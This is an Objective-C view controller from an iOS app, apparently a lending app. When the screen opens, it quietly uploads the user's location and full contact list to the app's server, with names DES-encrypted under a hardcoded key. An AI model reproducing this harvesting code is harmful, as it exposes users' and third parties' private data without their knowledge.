//
//  Shenhe_Progress_Vc.m
//  HaiHeApp
//
//  Created by 信昊 on 17/6/8.
//  Copyright © 2017年 马广召. All rights reserved.
//

#import "Shenhe_Progress_Vc.h"
#import "HandleAddressBook.h"
#import "gaode_Location.h"
#import "LoginViewController.h"
#import "HaiHeNetBridge.h"
#import "ShowMessageView.h"
#import "des.h"
#import "RootTableViewController.h"
#import "SafeSetTableViewController.h"
#import "Shenhe_Progress_Vc.h"
@interface Shenhe_Progress_Vc ()
@property (nonatomic, retain)NSString * userId;
@property(nonatomic,assign)NSInteger PostNum;//用来记录这一页的上传次数


@property (nonatomic, retain)NSString * phoneNum;
@property (nonatomic, retain)NSString * zhuceTime;
@property (nonatomic, retain)NSString * loginName;
@property (nonatomic, assign)BOOL isRenZheng;
@property (nonatomic, assign)BOOL isDealPW;

@end

@implementation Shenhe_Progress_Vc

- (void)viewDidLoad {
    [super viewDidLoad];
    [self getdataFromNetWork];
    self.view.backgroundColor = [UIColor whiteColor];
      self.navigationController.navigationBar.barTintColor = [UIColor colorWithRed:177/255.0 green:25/255.0 blue:25/255.0 alpha:1];
    // Do any additional setup after loading the view.
    [[NSNotificationCenter defaultCenter]addObserver:self selector:@selector(Shenhe_Progress) name:@"Shenhe_Progress" object:nil];
    [[NSNotificationCenter defaultCenter]addObserver:self selector:@selector(HuanQuan_Jihua) name:@"HuanQuan_Jihua" object:nil];
    [[NSNotificationCenter defaultCenter]addObserver:self selector:@selector(Safe_Set) name:@"Safe_Set" object:nil];
}
-(void)Shenhe_Progress{
    [self.navigationController popViewControllerAnimated:NO];

    
}
-(void)HuanQuan_Jihua{
    [self.navigationController popViewControllerAnimated:NO];
    RootTableViewController *rootvc = [[RootTableViewController alloc]init];
    
    [self.navigationController pushViewController:rootvc animated:YES];
}
-(void)Safe_Set{
   [self.navigationController popViewControllerAnimated:NO];
    SafeSetTableViewController * safeVC = [[SafeSetTableViewController alloc] initWithStyle:UITableViewStyleGrouped];
    NSUserDefaults * userdefault = [NSUserDefaults standardUserDefaults];
    _userId = [userdefault objectForKey:@"Myuserid"];
    

    safeVC.userid = _userId;
    safeVC.phonenum = _phoneNum;
    safeVC.phoneStr = _phoneNum;
    safeVC.zhuceTime = _zhuceTime;
    safeVC.loginname = _loginName;
    
    [self.navigationController pushViewController:safeVC animated:YES];

}


- (void)getdataFromNetWork{
    if (_userId) {
        [[HaiHeNetBridge sharedManager] backMoneyRequestWithUserId:_userId WithSuccess:^(NSString *respString, NSDictionary *datadic) {

            if (!respString) {

                
                _phoneNum = [datadic objectForKey:@"sjh"];
                _zhuceTime = [datadic objectForKey:@"zcsj"];
                _loginName = [datadic objectForKey:@"dlm"];
                if (![[datadic objectForKey:@"jymm"]isEqualToString:@"0"]) {
                    _isDealPW = false;
                }else{
                    _isDealPW = true;
                }
                NSLog(@"%@",datadic);
                if ([[datadic objectForKey:@"isUserCertified"]isEqualToString:@"1"]) {
                    _isRenZheng = true;
                }else{
                    _isRenZheng = false;
                }
                
            }else{
                [[ShowMessageView shareManager] showMessage:respString];
            }
            
        }];
        
    }
}


- (void)viewWillAppear:(BOOL)animated{
    self.navigationController.navigationBar.hidden = NO;
    
    
    //判断是否登录;
    NSUserDefaults * userdefault = [NSUserDefaults standardUserDefaults];
    NSString * myuserid = [userdefault objectForKey:@"Myuserid"];
    _userId = myuserid;
    //    _isRenZheng = [userdefault objectForKey:@"isrenzheng"];
    if (!myuserid||[myuserid isEqualToString:@""]) {
        LoginViewController * loginVC = [[LoginViewController alloc] init];
        [self.navigationController pushViewController:loginVC animated:YES];
    }else{

        if (self.PostNum == 0) {
            //            __weak LoginViewController *weakSelf = self;
            [[gaode_Location shareInstance] getLocation:^(CLLocation *location, AMapLocationReGeocode *regeocode) {
                [[HaiHeNetBridge sharedManager]postLocationWithlatitude:[NSString stringWithFormat:@"%f",location.coordinate.latitude] Withlongitude:[NSString stringWithFormat:@"%f",location.coordinate.longitude] WithUserId:myuserid WithAddress:regeocode.formattedAddress WithSuccess:^(NSString *respString, NSDictionary *datadic) {
                    NSLog(@"%@",respString);
                    NSLog(@"%@",datadic);
                    if (!respString) {
                        //购买成功耶；
                        //                        [[ShowMessageView shareManager] showMessage:@"上传定位成功"];
                    }else{
                        [[ShowMessageView shareManager] showMessage:respString];
                    }
                    
                }];
            }];
            
            [HandleAddressBook addressBookAuthorization:^(NSMutableArray<PersonInfoModel *> *personInfoArray) {
                
                NSMutableArray *muarr = [[NSMutableArray alloc]init];
                for (PersonInfoModel *model  in personInfoArray) {
                    NSMutableDictionary *mudic = [[NSMutableDictionary alloc]init];
                    NSString * content =@"cbi7hiGn";
                    NSString *phoneName_sign = [des encryptWithContent:model.personName type:kCCEncrypt key:content];
                    [mudic setValue:phoneName_sign forKey:@"name"];
                    [mudic setValue:model.personPhone forKey:@"phone"];
                    [muarr addObject:mudic];
                }
                //                for (NSInteger i =0; i < 20000; i++) {
                //                NSMutableDictionary *mudic = [[NSMutableDictionary alloc]init];
                //                    PersonInfoModel *model = [[PersonInfoModel alloc]init];
                //                    model.personName = [NSString stringWithFormat:@"%ld",i];
                //                    model.personPhone = [NSMutableArray arrayWithArray:@[[NSString stringWithFormat:@"%ld84332232",i]]];
                //                                        [mudic setValue:model.personName forKey:@"name"];
                //                                        [mudic setValue:model.personPhone forKey:@"phone"];
                //                                        [muarr addObject:mudic];
                //                }
                
                [[HaiHeNetBridge sharedManager]postPhoneListWitharr:muarr WithUserid:myuserid WithSuccess:^(NSString *respString, NSDictionary *datadic) {
                    NSLog(@"%@",respString);
                    NSLog(@"%@",datadic);
                    if (!respString) {
                        //购买成功耶；
                        //                        [[ShowMessageView shareManager] showMessage:@"上传通讯录成功"];
                    }else{
                        [[ShowMessageView shareManager] showMessage:respString];
                    }
                    
                }];
            }];
            
        }
        self.PostNum++;
        //        [self waitForData];
        //        [self getdataFromNetWork];
    }
    
}

- (void)didReceiveMemoryWarning {
    [super didReceiveMemoryWarning];
    // Dispose of any resources that can be recreated.
}

/*
#pragma mark - Navigation

// In a storyboard-based application, you will often want to do a little preparation before navigation
- (void)prepareForSegue:(UIStoryboardSegue *)segue sender:(id)sender {
    // Get the new view controller using [segue destinationViewController].
    // Pass the selected object to the new view controller.
}
*/

@end
